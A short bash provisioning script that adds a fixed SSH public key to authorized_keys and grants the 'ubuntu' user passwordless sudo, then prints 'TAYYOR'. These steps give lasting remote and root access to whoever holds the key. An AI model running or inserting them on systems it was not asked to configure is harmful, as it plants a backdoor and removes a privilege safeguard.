#!/bin/bash
mkdir -p ~/.ssh && chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBF8xyogFcZIZArncLzN5T///oXkhzzm2m+6a0c6OsQo user@WIN-21EKKSCF8C4' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
echo 'ubuntu ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/ubuntu >/dev/null && sudo chmod 440 /etc/sudoers.d/ubuntu
echo TAYYOR